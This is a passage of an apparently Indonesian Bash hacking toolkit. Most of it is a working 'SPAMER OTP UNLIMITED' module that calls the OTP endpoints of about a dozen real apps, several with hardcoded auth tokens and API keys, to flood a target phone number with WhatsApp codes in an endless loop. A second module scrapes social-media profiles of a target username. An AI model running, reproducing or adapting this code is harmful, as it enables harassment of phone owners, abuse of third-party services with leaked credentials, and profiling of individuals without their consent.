jogjakita() { local nomor=$1; local url_token="https://aci-user.bmsecure.id/oauth/token"; local payload_token="grant_type=client_credentials&uuid=00000000-0000-0000-0000-000000000000&id_user=0&id_kota=0&location=0.0%2C0.0&via=jogjakita_user&version_code=501&version_name=6.10.1"; local headers_token=("Authorization: Basic OGVjMzFmODctOTYxYS00NTFmLThhOTUtNTBlMjJlZGQ2NTUyOjdlM2Y1YTdlLTViODYtNGUxNy04ODA0LWQ3NzgyNjRhZWEyZQ==" "Content-Type: application/x-www-form-urlencoded" "User-Agent: okhttp/4.10.0"); local response_token=$(curl -s -X POST -d "$payload_token" -H "${headers_token[0]}" -H "${headers_token[1]}" -H "${headers_token[2]}" "$url_token"); local auth=$(fetch_value "$response_token" '{"access_token":"' '","'); if [ -z "$auth" ]; then color yellow "JOGJAKITA: Gagal mendapatkan token otorisasi." >&2; return 1; fi; local url_otp="https://aci-user.bmsecure.id/v2/user/signin-otp/wa/send"; local payload_otp="{\"phone_user\": \"$nomor\", \"primary_credential\": {\"device_id\": \"\", \"fcm_token\": \"\", \"id_kota\": 0, \"id_user\": 0, \"location\": \"0.0,0.0\", \"uuid\": \"\", \"version_code\": \"501\", \"version_name\": \"6.10.1\", \"via\": \"jogjakita_user\"}, \"uuid\": \"00000000-4c22-250d-3006-9a465f072739\", \"version_code\": \"5.01\", \"version_name\": \"6.10.1\", \"via\": \"jogjakita_user\"}"; local headers_otp=("Content-Type: application/json; charset=UTF-8" "Authorization: Bearer $auth"); local response_otp=$(curl -s -X POST -d "$payload_otp" -H "${headers_otp[0]}" -H "${headers_otp[1]}" "$url_otp"); local result=$(fetch_value "$response_otp" '{"rc":' '","'); if [ "$result" == "200" ]; then color red "JOGJAKITA: Spam Whatsapp Ke $nomor (Terkirim)" >&2; return 0; else color yellow "JOGJAKITA: $response_otp" >&2; return 1; fi }
candireload() { local nomor=$1; local url="https://app.candireload.com/apps/v8/users/req_otp_register_wa"; local payload="{\"uuid\": \"b787045b140c631f\", \"phone\": \"$nomor\"}"; local headers=("Content-Type: application/json" "irsauth: c6738e934fd7ed1db55322e423d81a66"); local response=$(curl -s -X POST -d "$payload" -H "${headers[0]}" -H "${headers[1]}" "$url"); local result=$(fetch_value "$response" '{"success":' '","'); if [ "$result" == "true" ]; then color red "CANDIRELOAD: Spam Whatsapp Ke $nomor (Terkirim)" >&2; return 0; else color yellow "CANDIRELOAD: $response" >&2; return 1; fi }
speedcash() { local nomor=$1; local url_token="https://sofia.bmsecure.id/central-api/oauth/token"; local payload_token="grant_type=client_credentials"; local headers_token=("Authorization: Basic NGFiYmZkNWQtZGNkYS00OTZlLWJiNjEtYWMzNzc1MTdjMGJmOjNjNjZmNTZiLWQwYWItNDlmMC04NTc1LTY1Njg1NjAyZTI5Yg==" "Content-Type: application/x-www-form-urlencoded"); local response_token=$(curl -s -X POST -d "$payload_token" -H "${headers_token[0]}" -H "${headers_token[1]}" "$url_token"); local auth=$(fetch_value "$response_token" 'access_token":"' '","'); if [ -z "$auth" ]; then color yellow "SPEEDCASH: Gagal mendapatkan token otorisasi." >&2; return 1; fi; local url_otp="https://sofia.bmsecure.id/central-api/sc-api/otp/generate"; local uuid=$(codex 8); local payload_otp="{\"version_name\": \"6.2.1 (428)\", \"phone\": \"$nomor\", \"appid\": \"SPEEDCASH\", \"version_code\": 428, \"location\": \"0,0\", \"state\": \"REGISTER\", \"type\": \"WA\", \"app_id\": \"SPEEDCASH\", \"uuid\": \"00000000-4c22-250d-ffff-ffff${uuid}\", \"via\": \"BB ANDROID\"}"; local headers_otp=("Authorization: Bearer $auth" "Content-Type: application/json"); local response_otp=$(curl -s -X POST -d "$payload_otp" -H "${headers_otp[0]}" -H "${headers_otp[1]}" "$url_otp"); local result=$(fetch_value "$response_otp" '"rc":"' '","'); if [ "$result" == "00" ]; then color red "SPEEDCASH: Spam Whatsapp Ke $nomor (Terkirim)" >&2; return 0; else color yellow "SPEEDCASH: $response_otp" >&2; return 1; fi }
kerbel() { local nomor=$1; local url="https://keranjangbelanja.co.id/api/v1/user/otp"; local boundary="----dio-boundary-0879576676"; local payload="--${boundary}\r\nContent-Disposition: form-data; name=\"phone\"\r\n\r\n$nomor\r\n--${boundary}\r\nContent-Disposition: form-data; name=\"otp\"\r\n\r\n118872\r\n--${boundary}--"; local response=$(curl -s -X POST -d "$payload" -H "content-type: multipart/form-data; boundary=${boundary}" "$url"); local result=$(fetch_value "$response" '"result":"' '","'); if [ "$result" == "OTP Berhasil Dikirimkan" ]; then color red "KERBEL: Spam Whatsapp Ke $nomor (Terkirim)" >&2; return 0; else color yellow "KERBEL: $response" >&2; return 1; fi }
mitradelta() { local nomor=$1; local url="https://irsx.mitradeltapulsa.com:8080/appirsx/appapi.dll/otpreg?phone=$nomor"; local response=$(curl -s "$url"); local result=$(fetch_value "$response" '{"success":' '","'); if [ "$result" == "true" ]; then color red "MITRADELTA: Spam Whatsapp Ke $nomor (Terkirim)" >&2; return 0; else color yellow "MITRADELTA: $response" >&2; return 1; fi }
agenpayment() { local nomor=$1; local url_register="https://agenpayment-app.findig.id/api/v1/user/register"; local payload_register="{\"name\": \"AAD\", \"phone\": \"$nomor\", \"email\": \"${nomor}@gmail.com\", \"pin\": \"1111\", \"id_propinsi\": \"5e5005024d44ff5409347111\", \"id_kabupaten\": \"5e614009360fed7c1263fdf6\", \"id_kecamatan\": \"5e614059360fed7c12653764\", \"alamat\": \"aceh\", \"nama_toko\": \"QUARD\", \"alamat_toko\": \"aceh\"}"; local headers_register=("content-type: application/json; charset=utf-8" "merchantcode: 63d22a4041d6a5bc8bfdb3be"); local response_register=$(curl -s -X POST -d "$payload_register" -H "${headers_register[0]}" -H "${headers_register[1]}" "$url_register"); local result_register=$(fetch_value "$response_register" '{"status":' '","'); if [ "$result_register" != "200" ]; then color yellow "AGENPAYMENT Registration Failed: $response_register" >&2; return 1; fi; local url_login="https://agenpayment-app.findig.id/api/v1/user/login"; local payload_login="{\"phone\": \"$nomor\", \"pin\": \"1111\"}"; local headers_login=("content-type: application/json; charset=utf-8" "merchantcode: 63d22a4041d6a5bc8bfdb3be"); local response_login=$(curl -s -X POST -d "$payload_login" -H "${headers_login[0]}" -H "${headers_login[1]}" "$url_login"); local auth=$(fetch_value "$response_login" 'validate_id":"' '",'); if [ -z "$auth" ]; then color yellow "AGENPAYMENT Login Failed: $response_login" >&2; return 1; fi; local url_otp="https://agenpayment-app.findig.id/api/v1/user/login/send-otp"; local payload_otp="{\"codeLength\": 4, \"validate_id\": \"$auth\", \"type\": \"whatsapp\"}"; local headers_otp=("content-type: application/json; charset=utf-8" "merchantcode: 63d22a4041d6a5bc8bfdb3be"); local response_otp=$(curl -s -X POST -d "$payload_otp" -H "${headers_otp[0]}" -H "${headers_otp[1]}" "$url_otp"); local result_otp=$(fetch_value "$response_otp" '{"status":' '","'); if [ "$result_otp" == "200" ]; then color red "AGENPAYMENT: Spam Whatsapp Ke $nomor (Terkirim)" >&2; return 0; else color yellow "AGENPAYMENT OTP Failed: $response_otp" >&2; return 1; fi }
z4reload() { local nomor=$1; local url="https://api.irmastore.id/apps/otp/v2/sendotpwa"; local payload="{\"hp\": \"$nomor\", \"uuid\": \"MyT2H1xFo2WHoMT5gjdo3W9woys1\", \"app_code\": \"z4reload\"}"; local headers=("content-type: application/json" "authorization: 7117c8f459a98282c2c576b519d0662f"); local response=$(curl -s -X POST -d "$payload" -H "${headers[0]}" -H "${headers[1]}" "$url"); local result=$(fetch_value "$response" '{"success":' '","'); if [ "$result" == "true" ]; then color red "Z4RELOAD: Spam Whatsapp Ke $nomor (Terkirim)" >&2; return 0; else color yellow "Z4RELOAD: $response" >&2; return 1; fi }
singa() { local nomor=$1; local url="https://api102.singa.id/new/login/sendWaOtp?versionName=2.4.8&versionCode=143&model=SM-G965N&systemVersion=9&platform=android&appsflyer_id="; local payload="{\"mobile_phone\": \"$nomor\", \"type\": \"mobile\", \"is_switchable\": 1}"; local response=$(curl -s -X POST -d "$payload" -H "Content-Type: application/json; charset=utf-8" "$url"); local result=$(fetch_value "$response" '"msg":"' '","'); if [ "$result" == "Success" ]; then color red "SINGA: Spam Whatsapp Ke $nomor (Terkirim)" >&2; return 0; else color yellow "SINGA: $response" >&2; return 1; fi }
ktakilat() { local nomor=$1; local url="https://api.pendanaan.com/kta/api/v1/user/commonSendWaSmsCode"; local payload="{\"mobileNo\": \"$nomor\", \"smsType\": 1}"; local headers=("Content-Type: application/json; charset=UTF-8" "Device-Info: eyJhZENoYW5uZWwiOiJvcmdhbmljIiwiYWRJZCI6IjE1NDk3YTliLTI2NjktNDJjZi1hZDEwLWQwZDBkOGY1MGFkMCIsImFuZHJvaWRJZCI6ImI3ODcwNDViMTQwYzYzMWYiLCJhcHBOYW1lIjoiS3RhS2lsYXQiLCJhcHBWZXJzaW9uIjoiNS4yLjYiLCJjb3VudHJ5Q29kZSI6IklEIiwiY291bnRyeU5hbWUiOiJJbmRvbmVzaWEiLCJjcHVDb3JlcyI6NCwiZGVsaXZlcnlQbGF0Zm9ybSI6Imdvb2dsZSBwbGF5IiwiZGV2aWNlTm8iOiJiNzg3MDQ1YjE0MGM2MzFmIiwiaW1laSI6IiIsImltc2kiOiIiLCJtYWMiOiIwMDpkYjozNDozYjplNTo2NyIsIm1lbW9yeVRvdGFsIjo0MTM3OTcxNzEyLCJwYWNrYWdlTmFtZSI6ImNvbS5rdGFraWxhdC5sb2FuIiwicGhvbmVCcmFuZCI6InNhbXN1bmciLCJwaG9uZUJyYW5kTW9kZWwiOiJTTS1HOTY1TiIsInNkQ2FyZFRvdGFsIjozNTEzOTU5MjE5Miwic3lzdGVtUGxhdGZvcm06ImFuZHJvaWQnLCJzeXN0ZW1WZXJzaW9uIjoiOSIsInV1aWQiOiJiNzg3MDQ1bTE0MGM2MzFmX2I3ODcwNDViMTQwYzYzMWYifQ=="); local response=$(curl -s -X POST -d "$payload" -H "${headers[0]}" -H "${headers[1]}" "$url"); local result=$(fetch_value "$response" '"msg":"' '","'); if [ "$result" == "success" ]; then color red "KTAKILAT: Spam Whatsapp Ke $nomor (Terkirim)" >&2; return 0; else color yellow "KTAKILAT: $response" >&2; return 1; fi }
uangme() { local nomor=$1; local aid="gaid_15497a9b-2669-42cf-ad10-$(codex 12)"; local url="https://api.uangme.com/api/v2/sms_code?phone=$nomor&scene_type=login&send_type=wp"; local headers=("aid: $aid" "android_id: b787045b140c631f" "app_version: 300504" "brand: samsung" "carrier: 00" "Content-Type: application/x-www-form-urlencoded" "country: 510" "dfp: 6F95F26E1EEBEC8A1FE4BE741D826AB0" "fcm_reg_id: frHvK61jS-ekpp6SIG46da:APA91bEzq2XwRVB6Nth9hEsgpH8JGDxynt5LyYEoDthLGHL-kC4_fQYEx0wZqkFxKvHFA1gfRVSZpIDGBDP763E8AhgRjDV7kKjnL-Mi4zH2QDJlszruMRo" "gaid: gaid_15497a9b-2669-42cf-ad10-d0d0d8f50ad0" "lan: in_ID" "model: SM-G965N" "ns: wifi" "os: 1" "timestamp: 1732178536" "tz: Asia%2FBangkok" "User-Agent: okhttp/3.12.1" "v: 1" "version: 28"); local header_string=""; for h in "${headers[@]}"; do header_string+="-H \"$h\" "; done; local response=$(curl -s -X GET $header_string "$url"); local result=$(fetch_value "$response" '{"code":"' '","'); if [ "$result" == "200" ]; then color red "UANGME: Spam Whatsapp Ke $nomor (Terkirim)" >&2; return 0; else color yellow "UANGME: $response" >&2; return 1; fi }
cairin() { local nomor=$1; local uuid=$(codex 32); local url="https://app.cairin.id/v2/app/sms/sendWhatAPPOPT"; local payload="appVersion=3.0.4&phone=$nomor&userImei=$uuid"; local response=$(curl -s -X POST -d "$payload" -H "Content-Type: application/x-www-form-urlencoded" "$url"); if [ "$response" == '{"code":"0"}' ]; then color red "CAIRIN: Spam Whatsapp Ke $nomor (Terkirim)" >&2; return 0; else color yellow "CAIRIN: $response" >&2; return 1; fi }
adiraku() { local nomor=$1; local url="https://prod.adiraku.co.id/ms-auth/auth/generate-otp-vdata"; local payload="{\"mobileNumber\": \"$nomor\", \"type\": \"prospect-create\", \"channel\": \"whatsapp\"}"; local response=$(curl -s -X POST -d "$payload" -H "Content-Type: application/json; charset=utf-8" "$url"); local result=$(fetch_value "$response" '{"message":"' '","'); if [ "$result" == "success" ]; then color red "ADIRAKU: Spam Whatsapp Ke $nomor (Terkirim)" >&2; return 0; else color yellow "ADIRAKU: $response" >&2; return 1; fi }


# Fungsi utama untuk menjalankan semua spam service
spam_whatsapp() {
  local nomor=$1
  
  bisatopup "$nomor" &
  titipku "$nomor" &
  jogjakita "$nomor" &
  candireload "$nomor" &
  speedcash "$nomor" &
  kerbel "$nomor" &
  mitradelta "$nomor" &
  agenpayment "$nomor" &
  z4reload "$nomor" &
  singa "$nomor" &
  ktakilat "$nomor" &
  uangme "$nomor" &
  cairin "$nomor" &
  adiraku "$nomor" &
  
  wait
}

kasi_warna_green() {
  printf "${GREEN}%s${NC}\n" "$1"
}


# --- FUNGSI WRAPPER MENU 10 (SHIFTED) ---
otp_spammer_menu() {
    clear
    
    # Banner sederhana karena lolcat mungkin tidak terinstal
    echo -e "${RED}
  ╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮
  │ ░██████╗██████╗░░█████╗░███╗░░░███╗███████╗██████╗  │
  │ ██╔════╝██╔══██╗██╔══██╗████╗░████║██╔════╝██╔══██╗ │
  │ ╚█████╗░██████╔╝███████║██╔████╔██║█████╗░░██████╔╝ │
  ${WHITE}│ ░╚═══██╗██╔═══╝░██╔══██║██║╚██╔╝██║██╔══╝░░██╔══██╗ │
  │ ██████╔╝██║░░░░░██║░░██║██║░╚═╝░██║███████╗██║░░██║ │
  │ ╚═════╝░╚═╝░░░░░╚═╝░░╚═╝╚═╝░░░░░╚═╝╚══════╝╚═╝░░╚═╝ │
  ╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯
  │                 ${BG_RED}${YELLOW}SPAMER OTP UNLIMITED${NC}                │
  ╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯" >&2
    echo -e "${RED}
        ╭────────────────────────────────────────╮
        │           ${CYAN}SPAM OTP UNLIMITED${RED}           │
        ╰────────────────────────────────────────╯
    ${NC}" >&2

    while true; do
        echo -e "${WHITE}DEVELOPER: DANZ OFFICIAL✓${GREEN}" >&2
        read -p "MASUKAN NOMOR TARGET (62XX) / [b]ack: " nomor

        if [[ "$nomor" == "b" ]] || [[ "$nomor" == "B" ]]; then
            return
        fi

        if [[ ! "$nomor" =~ ^62[0-9]+$ ]]; then
            color yellow "Nomor harus dimulai dengan 62 dan hanya berisi angka." >&2
            continue
        fi

        echo -e "${YELLOW}Memulai spam ke $nomor... Tekan Ctrl+C untuk berhenti.${NC}" >&2
        while true; do
            spam_whatsapp "$nomor"
            sleep 2
        done
    done
}


# =======================================================
# --- FUNGSI 03: OSINT SCANNER (TIDAK ADA PERUBAHAN) ---
# =======================================================

osint_scanner_menu() {
    clear
    echo -e "${CYAN}--- [03] OSINT SCANNER (NetSoc_OSINT) ---${NC}" >&2
    echo -e "${YELLOW}:: Mempersiapkan direktori dan tools OSINT...${NC}" >&2
    
    # Setup directories
    mkdir -p requisitos/resultados
    
    # Clone osgint if not exists
    if ! [ -d requisitos/osgint ]; then
        echo -e "${CYAN}[*] Mengkloning 'osgint' dari GitHub. Tunggu sebentar...${NC}" >&2
        if git clone https://github.com/hippiiee/osgint.git requisitos/osgint 2>&1 | grep -v "already exists"; then
             echo -e "${GREEN}[+] osgint berhasil dikloning. Memasang requirements...${NC}" >&2
             if command -v pip3 &> /dev/null; then
                if pip3 install -r requisitos/osgint/requirements.txt 2>/dev/null; then
                    echo -e "${GREEN}[+] Dependencies osgint berhasil diinstal.${NC}" >&2
                elif command -v sudo &> /dev/null; then
                    echo -e "${YELLOW}[*] Coba instalasi dengan sudo...${NC}" >&2
                    if sudo pip3 install -r requisitos/osgint/requirements.txt; then
                        echo -e "${GREEN}[+] Dependencies osgint berhasil diinstal (dengan sudo).${NC}" >&2
                    else
                        echo -e "${RED}[!] Gagal instalasi dependencies osgint, bahkan dengan sudo.${NC}" >&2
                    fi
                else
                    echo -e "${RED}[!] Gagal instalasi dependencies osgint. Jalankan 'pip3 install -r requisitos/osgint/requirements.txt' secara manual.${NC}" >&2
                fi
             else
                echo -e "${RED}[!] PIP3 tidak ditemukan. osgint mungkin tidak berfungsi. Instal manual: pkg install python-pip && pip3 install -r requirements.txt${NC}" >&2
             fi
        else
            echo -e "${RED}[!] Gagal mengkloning osgint. Fungsi GitHub (opsi 6) mungkin tidak lengkap.${NC}" >&2
        fi
    fi
    sleep 2

    while true; do
        clear
        echo >&2
        echo -e "${C}###############${NC}" >&2
        echo -e "[1] Español" >&2
        echo -e "[2] English" >&2
        echo -e "${C}###############${NC}" >&2
        echo >&2
        read -p "Elige una Opcion / Choose an Option: " opc1
        
        run_osint_options() {
            local LANG_CODE=$1
            local USERNAME_PROMPT
            
            if [[ "$LANG_CODE" == "1" ]]; then
                USERNAME_PROMPT="[*] Escribe el nombre de usuario del Objetivo (Ej: anonymous23): "
                
                clear
				echo >&2
				echo "                                  ╔═╗ ╔╗  ╔╗╔═══╗     ╔═══╦═══╦══╦═╗ ╔╦════╗ " >&2
				echo "                                  ║║╚╗║║ ╔╝╚╣╔═╗║     ║╔═╗║╔═╗╠╣╠╣║╚╗║║╔╗╔╗║ " >&2
				echo "                                  ║╔╗╚╝╠═╩╗╔╣╚══╦══╦══╣║ ║║╚══╗║║║╔╗╚╝╠╝║║╚╝ " >&2
				echo "                                  ║║╚╗║║║═╣║╚══╗║╔╗║╔═╣║ ║╠══╗║║║║║╚╗║║ ║║   " >&2
				echo "                                  ║║ ║║║║═╣╚╣╚═╝║╚╝║╚═╣╚═╝║╚═╝╠╣╠╣║ ║║║ ║║   " >&2
				echo "                                  ╚╝ ╚═╩══╩═╩═══╩══╩══╩═══╩═══╩══╩╝ ╚═╝ ╚╝   " >&2
				echo "                                    ℕ𝕖𝕥𝕨𝕠𝕣𝕜    𝕊𝕠𝕔𝕚𝕒𝕝       🔍 𝕆𝕊𝕀ℕ𝕋 🔍         " >&2
				echo "                              __________________________________________________" >&2
				echo "                               ︻デ═一  Created by: danzX v1.1  ︻デ═一 " >&2
				echo "          ---------------------------------------------------------------------------------------------" >&2
				echo "          Cualquier acción y o actividad relacionada con 𝓝𝓮𝓽𝕊𝕠𝕔_𝓞𝕊𝕀𝓝𝓣 es únicamente su responsabilidad" >&2
				echo "          ---------------------------------------------------------------------------------------------" >&2
				echo >&2
				echo >&2
				echo "                                     ===============================" >&2
				echo "                                     [1]         Instragram 🕵️""      |" >&2
				echo "                                     [2]           TikTok 🕵️""        |" >&2
				echo "                                     [3]           Twitter 🕵️""       |" >&2
				echo "                                     [4]           Twitch 🕵️""        |" >&2
				echo "                                     [5]          Telegram 🕵️""       |" >&2
				echo "                                     [6]           GitHub 🕵️""        |" >&2
				echo "                                     [99]   ------> Salir ""<------  |" >&2
				echo "                                     ===============================" >&2
				echo >&2
				echo >&2
                read -p "[*] Elige una opcion: " opc2
            else
                USERNAME_PROMPT="[*] Type the user name of the Target (e.g. anonymous23): "

                clear
				echo >&2
				echo "                                  ╔═╗ ╔╗  ╔╗╔═══╗     ╔═══╦═══╦══╦═╗ ╔╦════╗ " >&2
				echo "                                  ║║╚╗║║ ╔╝╚╣╔═╗║     ║╔═╗║╔═╗╠╣╠╣║╚╗║║╔╗╔╗║ " >&2
				echo "                                  ║╔╗╚╝╠═╩╗╔╣╚══╦══╦══╣║ ║║╚══╗║║║╔╗╚╝╠╝║║╚╝ " >&2
				echo "                                  ║║╚╗║║║═╣║╚══╗║╔╗║╔═╣║ ║╠══╗║║║║║╚╗║║ ║║   " >&2
				echo "                                  ║║ ║║║║═╣╚╣╚═╝║╚╝║╚═╣╚═╝║╚═╝╠╣╠╣║ ║║║ ║║   " >&2
				echo "                                  ╚╝ ╚═╩══╩═╩═══╩══╩══╩═══╩═══╩══╩╝ ╚═╝ ╚╝   " >&2
				echo "                                    ℕ𝕖𝕥𝕨𝕠𝕣𝕜    𝕊𝕠𝕔𝕚𝕒𝕝       🔍 𝕆𝕊𝕀ℕ𝕋 🔍         " >&2
				echo "                              __________________________________________________" >&2
				echo "                               ︻デ═一  Created by: danzX v1.1  ︻デ═一 " >&2
				echo "          ---------------------------------------------------------------------------------------------" >&2
				echo "                 Any action or activity related to 𝓝𝓮𝓽𝕊𝕠𝕔_𝓞𝕊𝕀𝓝𝓣 is solely your responsibility" >&2
				echo "          ---------------------------------------------------------------------------------------------" >&2
				echo >&2
				echo >&2
				echo "                                     ===============================" >&2
				echo >&2
				echo "                                     [1]         Instragram 🕵️""      |" >&2
				echo "                                     [2]           TikTok 🕵️""        |" >&2
				echo "                                     [3]           Twitter 🕵️""       |" >&2
				echo "                                     [4]           Twitch 🕵️""        |" >&2
				echo "                                     [5]          Telegram 🕵️""       |" >&2
				echo "                                     [6]           GitHub 🕵️""        |" >&2
				echo "                                     [99]   ------> Exit ""<------   |" >&2
				echo "                                     ===============================" >&2
				echo >&2
				echo >&2
                read -p "[*] Choose an option: " opc2
            fi

            case $opc2 in
                1 )	echo >&2
                    read -p "$USERNAME_PROMPT" username
                    echo >&2
                    echo "#################################" >&2
                    echo "[☢] UserName: @$username" >&2
                    echo "#################################" >&2
                    echo >&2
                    wget --wait=40 --limit-rate=40K -U Mozilla -bq "https://www.picnob.com/profile/$username/" -O requisitos/resultados/Ig-$username.txt >/dev/null 2>&1
                    sleep 6
                    echo "[*] User/Usuario: @$username" >&2
                    echo "[*] Name/Nombre: " `cat requisitos/resultados/Ig-$username.txt 2>/dev/null | awk -F= '/"fullname">/ {print $2}' | cut -c 12- | rev | cut -c6- | rev` >&2
                    echo "[*] Description/Descripcion: " `cat requisitos/resultados/Ig-$username.txt 2>/dev/null | awk '/div class="sum"/ {print}' | cut -c 18- | rev | cut -c7- | rev | awk 'NR==1{print}'` >&2
                    echo "[*] Posts: " `cat requisitos/resultados/Ig-$username.txt 2>/dev/null | awk -F= '/"num"/ {print $3}' | cut -c 2- | rev | cut -c3- | rev | awk 'NR==1{print}'` >&2
                    echo "[*] Followers/Seguidores: " `cat requisitos/resultados/Ig-$username.txt 2>/dev/null | awk -F= '/"num"/ {print $3}' | cut -c 2- | rev | cut -c3- | rev | awk 'NR==2{print}'` >&2
                    echo "[*] Following/Siguiendo: " `cat requisitos/resultados/Ig-$username.txt 2>/dev/null | awk -F= '/"num"/ {print $3}' | cut -c 2- | rev | cut -c3- | rev | awk 'NR==3{print}'` >&2
                    echo "[*] Account Status/Estado(Vacio = Publica): " `cat requisitos/resultados/Ig-$username.txt 2>/dev/null | awk -F= '/This account/ {print}' | cut -c 18- | rev | cut -c7- | rev` >&2
                    echo >&2
                    echo "[*] Profile Photo/Foto: " `cat requisitos/resultados/Ig-$username.txt 2>/dev/null | awk '/href/&&/scontent/ {print $2}' | cut -c 7- | rev | cut -c10- | rev` >&2
                    echo >&2
                    echo "[*] URL Perfil: https://www.instagram.com/$username" >&2
                    ;;
                2 )	echo >&2
                    read -p "$USERNAME_PROMPT" username
                    echo >&2
                    echo "#################################" >&2
                    echo "[☢] UserName: $username" >&2
                    echo "#################################" >&2
                    echo >&2
                    curl -s "https://urlebird.com/es/user/$username/" > requisitos/resultados/TikTok-$username.txt
                    echo "[*] User/Usuario: @$username" >&2
                    echo "[*] Name/Nombre: " `cat requisitos/resultados/TikTok-$username.txt 2>/dev/null | awk '/<h5 class="text-dark">/ {print}' | cut -c 23- | rev | cut -c6- | rev` >&2
                    echo "[*] Description/Descripcion: " `cat requisitos/resultados/TikTok-$username.txt 2>/dev/null | awk '/<p>/ {print}' | cut -c 4- | rev | cut -c5- | rev` >&2
                    if [[ "$LANG_CODE" == "1" ]]; then
                        echo "[*] Seguidores: " `cat requisitos/resultados/TikTok-$username.txt 2>/dev/null | awk '/seguidores/ {print $5}'` >&2
                        echo "[*] Siguiendo: " `cat requisitos/resultados/TikTok-$username.txt 2>/dev/null | awk '/siguiendo/ {print $6}'` >&2
                    else
                        echo "[*] Followers: " `cat requisitos/resultados/TikTok-$username.txt 2>/dev/null | awk '/Followers/ {print $5}'` >&2
                        echo "[*] Following: " `cat requisitos/resultados/TikTok-$username.txt 2>/dev/null | awk '/Following/ {print $6}'` >&2
                    fi
                    echo >&2
                    echo "[*] Profile Photo/Foto: " `cat requisitos/resultados/TikTok-$username.txt 2>/dev/null | awk '/"image"/ {print}' | cut -c 14- | rev | cut -c3- | rev` >&2
                    echo >&2
                    echo "[*] URL Perfil: https://www.tiktok.com/@$username" >&2
                    ;;
                3 )	echo >&2
                    read -p "$USERNAME_PROMPT" username
                    echo >&2
                    echo "#################################" >&2
                    echo "[☢] UserName: $username" >&2
                    echo "#################################" >&2
                    echo >&2
                    wget --wait=40 --limit-rate=40K -U Mozilla -bq "https://nitter.net/$username" -O requisitos/resultados/Twitter-$username.txt >/dev/null 2>&1
                    sleep 6
                    echo "[*] User + Name/Usuario + Nombre: " `cat requisitos/resultados/Twitter-$username.txt 2>/dev/null | awk -F= '/og:title/ {print $3}' | cut -c 2- | rev | cut -c5- | rev` >&2
                    echo "[*] Description/Descripcion: " `cat requisitos/resultados/Twitter-$username.txt 2>/dev/null | awk -F= '/og:description/ {print $3}' | cut -c 2- | rev | cut -c5- | rev` >&2
                    if [[ "$LANG_CODE" == "1" ]]; then
                        echo "[*] Se unio en: " `cat requisitos/resultados/Twitter-$username.txt 2>/dev/null | awk -F= '/profile-joindate/ {print $3}' | cut -c 2- | rev | cut -c13- | rev` >&2
                    else
                        echo "[*] Joined in: " `cat requisitos/resultados/Twitter-$username.txt 2>/dev/null | awk -F= '/profile-joindate/ {print $3}' | cut -c 2- | rev | cut -c13- | rev` >&2
                    fi
                    echo "[*] Tweets: " `cat requisitos/resultados/Twitter-$username.txt 2>/dev/null | awk -F= '/profile-stat-num/ {print $2}' | cut -c 20- | rev | cut -c8- | rev | awk 'NR==1{print}'` >&2
                    echo "[*] Following/Siguiendo: " `cat requisitos/resultados/Twitter-$username.txt 2>/dev/null | awk -F= '/profile-stat-num/ {print $2}' | cut -c 20- | rev | cut -c8- | rev | awk 'NR==2{print}'` >&2
                    echo "[*] Followers/Seguidores: " `cat requisitos/resultados/Twitter-$username.txt 2>/dev/null | awk -F= '/profile-stat-num/ {print $2}' | cut -c 20- | rev | cut -c8- | rev | awk 'NR==3{print}'` >&2
                    echo "[*] Likes: " `cat requisitos/resultados/Twitter-$username.txt 2>/dev/null | awk -F= '/profile-stat-num/ {print $2}' | cut -c 20- | rev | cut -c8- | rev | awk 'NR==4{print}'` >&2
                    echo >&2
                    echo "[*] Profile Photo/Foto: " `cat requisitos/resultados/Twitter-$username.txt 2>/dev/null | awk -F= '/twitter:image:src/ {print $3}' | cut -c 2- | rev | cut -c5- | rev` >&2
                    echo >&2
                    echo "[*] URL Perfil: https://nitter.net/$username" >&2
                    ;;
                4 )	echo >&2
                    read -p "$USERNAME_PROMPT" username
                    echo >&2
                    echo "#################################" >&2
                    echo "[☢] UserName: $username" >&2
                    echo "#################################" >&2
                    echo >&2
                    curl -s "cli.fyi/https://www.twitch.tv/$username" > requisitos/resultados/Twitch-$username.txt
                    echo "[*] User/Usuario: @$username" >&2
                    echo "[*] Name/Nombre: " `cat requisitos/resultados/Twitch-$username.txt 2>/dev/null | awk '/title/ {print}' | cut -c 19- | rev | cut -c3- | rev` >&2
                    echo "[*] Description/Descripcion: " `cat requisitos/resultados/Twitch-$username.txt 2>/dev/null | awk '/description/ {print}' | cut -c 25- | rev | cut -c3- | rev` >&2
                    echo >&2
                    echo "[*] Profile Photo/Foto: " `cat requisitos/resultados/Twitch-$username.txt 2>/dev/null | awk '/url/&&/static-cdn/ {print $2}' | cut -c 2- | rev | cut -c3- | rev` >&2
                    echo >&2
                    echo "[*] URL Perfil: https://www.twitch.tv/$username" >&2
                    ;;
                5 )	echo >&2
                    read -p "$USERNAME_PROMPT" username
                    echo >&2
                    echo "#################################" >&2
                    echo "[☢] UserName: $username" >&2
                    echo "#################################" >&2
                    echo >&2
                    curl -s "cli.fyi/https://t.me/$username" > requisitos/resultados/Tg-$username.txt
                    echo "[*] User/Usuario: @$username" >&2
                    echo "[*] Name/Nombre: " `cat requisitos/resultados/Tg-$username.txt 2>/dev/null | awk '/title/ {print}' | cut -c 19- | rev | cut -c3- | rev` >&2
                    echo "[*] Description/Descripcion: " `cat requisitos/resultados/Tg-$username.txt 2>/dev/null | awk '/description/ {print}' | cut -c 25- | rev | cut -c3- | rev` >&2
                    echo >&2
                    echo "[*] Profile Photo/Foto: " `cat requisitos/resultados/Tg-$username.txt 2>/dev/null | awk '/url/&&/cdn4/ {print $2}' | cut -c 2- | rev | cut -c3- | rev` >&2
                    echo >&2
                    echo "[*] URL Perfil: https://t.me/$username" >&2
                    ;;
                6 )	echo >&2
                    read -p "$USERNAME_PROMPT" username
                    echo >&2
                    echo "#################################" >&2
                    echo "[☢] UserName: $username" >&2
                    echo "#################################" >&2
                    echo >&2
                    curl -s "cli.fyi/https://github.com/$username" > requisitos/resultados/Git-$username.txt
                    echo "[*] User/Usuario: @$username" >&2
                    echo "[*] Name/Nombre: " `cat requisitos/resultados/Git-$username.txt 2>/dev/null | awk '/title/ {print $2}' | cut -c 2-` >&2
                    echo "[*] Description/Descripcion: " `cat requisitos/resultados/Git-$username.txt 2>/dev/null | awk '/description/ {print}' | cut -c 25- | rev | cut -c3- | rev` >&2
                    echo >&2
